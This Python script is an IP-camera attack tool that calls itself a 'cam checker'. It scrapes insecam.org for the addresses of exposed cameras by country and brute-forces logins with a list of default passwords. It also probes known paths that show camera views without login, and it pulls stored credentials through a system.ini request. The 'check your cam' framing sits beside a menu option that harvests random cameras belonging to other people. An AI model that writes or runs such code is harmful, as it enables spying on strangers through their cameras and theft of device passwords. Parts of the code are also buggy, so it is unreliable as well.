import colorama
from colorama import Fore, Back, Style
import requests,re,os,time,sys,platform
def cls():
    os.system("clear")
def bf():
        print(Fore.WHITE + "Enter the camera to use brute force. As an example (https://192.168.1.1/)")
        url = input()
        administrator = ("admin")
        password = ("033747900")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[#             ] 1/14")
        administrator = ("admin")
        password = ("password")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[##            ] 2/14")
        administrator = ("admin")
        password = ("admin")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[###           ] 3/14")
        administrator = ("pass")
        password = ("pass")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[####          ] 4/14")
        administrator = ("admin")
        password = ("password")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[#####         ] 5/14")
        administrator = ("pass")
        password = ("admin")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[######        ] 6/14")
        administrator = ("root")
        password = ("toor")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[#######       ] 7/14")
        administrator = ("admin")
        password = ("ipcam")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[########      ] 8/14")
        administrator = ("ADmins")
        password = ("sjdasd")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[#########     ] 9/14")
        administrator = ("admin")
        password = ("12345")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[##########    ] 10/14")
        administrator = ("admin")
        password = ("8888888")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[###########   ] 11/14")
        administrator = ("admin")
        password = ("123")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[############  ] 12/14")
        administrator = ("admin")
        password = ("132")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[############# ] 13/14")
        administrator = ("admin")
        password = ("")
        request = requests.get(url, auth=(administrator, password), )
        status = request.status_code
        if status == 200:
            print(Fore.GREEN+"login-"+administrator+" Pass-"+password)
        print("[##############] 14/14")
        print(" Plese select exit to the main menu or repeat the script")
        a =input("Enter exit or repeat ")
        if a == "exit":
             main2()
        if a == "repeat": 
            bf()
def rd():
     print("""
Please select your country
1. Russian Federation                        
2. United States                           
3. Japan                                        
4. Canada                                     
5. New Zealand                           
6. Ukraine                       
7. Germany                       
8. Austria                       
9. Spain                       
10. Turkey 
11. Hong Kong
12. Greece
13. Portugal
14. Singapure
15. Columbia  
       """) 
     ps = int(input(""))
     if ps == 1:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("Please select [y/n]")
            sp = input()
            if sp == "y":
              print(Fore.RESET + "\n")      
              cls()
              try:
                  headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                  for page in range (0,82):
            
                      url = ("https://www.insecam.org/en/bycountry/RU/?page="+str(page))
             
                      res = requests.get(url, headers=headers)
                      findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                      count = 0
                                
                      for _ in findip:
                           hasil = findip[count]

                           print ("\033[1;37m",hasil)


                           f = open('logs.txt' , 'a')
                           f.write(f'{findip}' + '\n')
                           f.close()

                           count += 1
              except:
                 print ("") 

     if ps == 2:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,720):
      
                    url = ("https://www.insecam.org/en/bycountry/US/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;37m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")
     if ps == 3:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,232):
      
                    url = ("https://www.insecam.org/en/bycountry/JP/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;37m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")
     if ps == 4:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,38):
      
                    url = ("https://www.insecam.org/en/bycountry/CA/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;37m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")             
     if ps == 5:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,5):
      
                    url = ("https://www.insecam.org/en/bycountry/NZ/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;37m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")             
     if ps == 6:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,2):
      
                    url = ("https://www.insecam.org/en/bycountry/UK/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;37m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ") 
     if ps == 7:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,107):
      
                    url = ("https://www.insecam.org/en/bycountry/DE/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")
     if ps == 8:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,48):
      
                    url = ("https://www.insecam.org/en/bycountry/AT/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                         count += 1
            except:
                print (" ")           
     if ps == 9:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,39):
      
                    url = ("https://www.insecam.org/en/bycountry/ES/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")  
     if ps == 10:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,54):
      
                    url = ("https://www.insecam.org/en/bycountry/TR/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")             
     if ps == 11:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,7):
      
                    url = ("https://www.insecam.org/en/bycountry/HK/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")  
     if ps == 12:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,8):
      
                    url = ("https://www.insecam.org/en/bycountry/GR/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")           
     if ps == 13:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,7):
      
                    url = ("https://www.insecam.org/en/bycountry/PT/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ")        
     if ps == 14:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,7):
      
                    url = ("https://www.insecam.org/en/bycountry/SG/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()

                         count += 1
            except:
                print (" ")      
     if ps == 15:
            print(Fore.BLUE + "When the command is executed, a file with all cameras (logs.txt) appears in the folder.  To stop the program press Ctrl + c.")
            print("\n")   
            cls()
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0'}       
                for page in range (0,6):
      
                    url = ("https://www.insecam.org/en/bycountry/CO/?page="+str(page))
            
                    res = requests.get(url, headers=headers)
                    findip = re.findall('http://\d+.\d+.\d+.\d+:\d+', res.text)
                    count = 0
                                
                    for _ in findip:
                         hasil = findip[count]

                         print ("\033[1;31m",hasil)
                         f = open('logs.txt' , 'a')
                         f.write(f'{findip}' + '\n')
                         f.close()
                 
                         count += 1
            except:
                print (" ") 
def cw():
    print("Please enter your cam https address")
    cam = input()
    a = cam.replace("/","/")
    f=open(r'data.txt',"wb") 
    ufr = requests.get(a+"/system.ini?loginuse&loginpas") 
    f.write(ufr.content) 
    f.close()
    print("data saved to logs.txt")
    f = open("logs.txt")
    data = f.readlines()
    f.close()
    for line in data:
        out = re.search("admin" , line)
        if out:
            b= line.replace(" ", "")
            newstr = b.replace(" ", "")
            f = open('logs.txt' , 'a')
            f.write(a+" "+line)
            f.close()
            print(" Plese select exit to the main menu or repeat the script")
            a =input("Enter exit or repeat")
            if a == "exit":
                main2()
            if a == "repeat": 
            	cw()
def exploit():
    cls()
    print("""Do not put "/" at the end of the address.This will break the check""")
    print(Fore.BLUE + """Chek vulnerable codes in "vulnerability codes.txt" """)
    a = input("Type your cam: ")
    print("\n")  
    r = requests.get(a + "/viewer/live/")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 1")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/live/cam.html")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 2")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/view/view.shtml")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 3")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/cgi-bin/guestimage.html")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 4")
    else:
         print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/ViewerFrame?")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 5")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/gallery.html")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 6")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/MultiCameraFrame?")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 7")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/system.ini?loginuse&loginpas")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 8")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/index.html")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 9")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0&1602178460")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable. -vulnerable code is 10")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/webcapture.jpg?command=snap&channel=1?1602180710")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable -vulnerable code is 11")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    r = requests.get(a + "/?action=stream")
    s = r.status_code
    if s == 200:
        print(Fore.RED + "your camera is vulnerable -vulnerable code is 12")
    else:
        print( Fore.GREEN + "your camera is not vulnerable")
    print(" Plese select exit to the main menu or repeat the script")
    a =input("Enter exit or repeat ")
    if a == "exit":
    	main2()
    if a == "repeat": 
        exploit()

def vc():
    a = input("Please enter your code")
    if a == 1:
    	print("""1 - Viewing without registration
				 Description of the vulnerability:
				 (/viewer/live/) In the link.""")
    if a == 2:
    	print("""2- Viewing without registration
				 Description of the vulnerability:
				 (/live/cam.html) In the link.""")
    if a == 3:
    	print("""3- Viewing without registration
				 Description of the vulnerability:
			     (/view/view.shtml) In the link. """)
    if a == 4:
    	print("""4- Viewing without registration
					Description of the vulnerability:
					(/cgi-bin/guestimage.html) In the link. """)
    if a == 5:
    	print("""5- Viewing without registration
					Description of the vulnerability:
					(/ViewerFrame?) In the link. """)
    if a == 6:
    	print("""6- Access to view photos without authorization
				 Description of the vulnerability:
				 (/gallery.html) In the link. """)
    if a == 7:
    	print("""7- Viewing without registration
				 Description of the vulnerability:
				 (/MultiCameraFrame?) In the link. """)
    if a == 8:
    	print("""8- Retrieving a password from a remote server in a file
				 Description of the vulnerability:
				 (/system.ini?loginuse&loginpas) In the link.. """)
    if a == 9:
    	print("""9- Viewing without registration
				 Description of the vulnerability:
				 (/index.html) In the link. """)
    if a == 10:
    	print("""10- Getting a screenshot from the server without registering
				 Description of the vulnerability:
				 (/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0&1602178460) In the link.
				!maybe your camera send a file with a 404 error, please check it manually if the program found this vulnerability! """)
    if a == 11:
    	print("""11- Getting a screenshot from the server without registering
				 Description of the vulnerability:
				 (/webcapture.jpg?command=snap&channel=1?1602180710) In the link.
				 !maybe your camera send a file with a 404 error, please check it manually if the program found this vulnerability!""")
    if a ==12:
        print("""12- Viewing without registration
                 Description of the vulnerability:
                 (/?action=stream)In the link.""")
    if a== "all codes":
    	print("""
1 - Viewing without registration
Description of the vulnerability:
(/viewer/live/) In the link.
-------------------------------------------------------------------------------------------------------------
2- Viewing without registration
Description of the vulnerability:
(/live/cam.html) In the link.
--------------------------------------------------------------------------------------------------------------
3- Viewing without registration
Description of the vulnerability:
(/view/view.shtml) In the link.
--------------------------------------------------------------------------------------------------------------
4- Viewing without registration
Description of the vulnerability:
(/cgi-bin/guestimage.html) In the link.
---------------------------------------------------------------------------------------------------------------
5- Viewing without registration
Description of the vulnerability:
(/ViewerFrame?) In the link.
----------------------------------------------------------------------------------------------------------------
6- Access to view photos without authorization
Description of the vulnerability:
(/gallery.html) In the link.
----------------------------------------------------------------------------------------------------------------
7- Viewing without registration
Description of the vulnerability:
(/MultiCameraFrame?) In the link.
-----------------------------------------------------------------------------------------------------------------
8- Retrieving a password from a remote server in a file
Description of the vulnerability:
(/system.ini?loginuse&loginpas) In the link.
------------------------------------------------------------------------------------------------------------------
9- Viewing without registration
Description of the vulnerability:
(/index.html) In the link.
------------------------------------------------------------------------------------------------------------------
10- Getting a screenshot from the server without registering
Description of the vulnerability:
(/cgi-bin/snapshot.cgi?chn=0&u=admin&p=&q=0&1602178460) In the link.
!maybe your camera send a file with a 404 error, please check it manually if the program found this vulnerability!
-------------------------------------------------------------------------------------------------------------------
11- Getting a screenshot from the server without registering
Description of the vulnerability:
(/webcapture.jpg?command=snap&channel=1?1602180710) In the link.
!maybe your camera send a file with a 404 error, please check it manually if the program found this vulnerability!
------------------------------------------------------------------------------------------------------------------""")
def main2():
    cls()
    print(Fore.MAGENTA+"""
                                                              .-:::----------:::----...........--.              
                                                              .-:::::::*+==+=====+++===++*-------.              
                                                              .--------*+++=%%%%==++=%===*-.......              
                                                                ....---:****+++=++***=+**:-.....                
                                              ...............---------------*++++*:::+***:.                     
                      .-:*+=%%%%==%%:......------------------------------------+=+++++:-..                      
                .:%#@@@############@##%-----------------------------------------:*:::*.                         
               :##########@@@@@@@@@@@@##:-----................-------------------:---:.                         
              .@#########@@@@@@@@@@@@@@@%-..........................-.......----.-----.                         
              .%########@@@@@@@@@@@@@@@@@%-...............................-----...----.                         
               :########@@@@@@@@@@@#@@@@#@=-.........................----------...----.                         
               .@#########@@@@@########@@##*.........................----------...----                          
                .+###@@@#@@%%%%%=====##@@@#:..................--::-:.-----------..-::.                          
                   .*@@@#@%%%%%=%=%%%@##@@#+...........................----------...:.                           
                    -%@@@#%%%%%====%%%##@@#%-..........................----------....                            
                    .=@@@#%%%%%%%==%%%##@@@#-.........................-----------...                            
                    .+@@@#@%%%%%%%%%%%@##@@#*......................----------------.                            
                    .-@@@#@%%%%%%%%%%%@##@@#+-..............-------------::::::----.                            
                     .=@@@#@@@@@@@@@@@@##@@#=-.....----------------::::::::::::---.                             
                     .*@@@##############@@@#%--------------------::::::::::::::-.                               
                     .-%@@@@@@@@@@@@@@@@@@@#@---------------::::::::::::::--...                                 
                      .+@@@@@@@@@@@@@@@@@@@@#--------:::::::::::::::-...                                        
                       .+%@@@@@@@@@@@@@@@@@#%-:::::::::::::--...                                                
                        .-*=@@@@@@@@@@@@@@@+-::::--....                                                         
                 UWCС(universal web cam cheker by MekoNix)                                   """)
    time.sleep(1)   
    print(Fore.YELLOW + """
    [1]Get a list of random cameras
        
    [2]Check you cam """)
    num = int(input("select: "))

    if num == 1:
        rd()
    if num == 2:
      print(Fore.YELLOW + """
     [1]With using vulnerabilities
        
     [2]Brute force 

     [3]Vulnerability /systeminilogin:pass
 
     [4]Scan ports
 
     [5]Chek vulnerabulity codes""")
      ps = int(input("I choose: "))
      if ps == 1:
       exploit()
    if ps == 2: 
        bf()
    if ps == 3:
        cw()
    if ps == 4:
        print("In develop")
    if ps == 5:
        vc()